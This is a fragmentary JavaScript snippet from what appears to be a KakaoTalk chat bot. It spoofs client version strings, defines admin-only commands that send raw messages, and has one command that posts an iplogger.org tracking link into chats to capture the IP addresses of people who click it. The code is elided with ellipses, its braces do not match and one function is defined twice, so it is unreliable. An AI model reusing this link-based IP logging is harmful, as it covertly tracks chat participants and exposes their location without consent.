...
client.configProvider.configuration.version = '3.4.7';
client.configProvider.configuration.appVersion = '3.4.7.2777';
...
if(chat.Text.startsWith("/글쓰기 ") && admin.includes(id)) {
         ...
         client.chatManager.sendRaw(chat.channel,98,'',{ "os": [
      {
         "t": 1,
         "ct": a,
         "jct": a
         ...
         function sendAny(chat, link) {
            ...
            if(chat.Text == "/iip" && admin.includes(id)) {
			 ...
			 if(chat.Text == "/앙앙" && admin.includes(id)) {
				 ...
				 switch(value) {
				   case 0 :
             sendAny(chat, "https://iplogger.org/2L3bq7");
                 break;
             }
            }
             function sendAny(chat, link) {
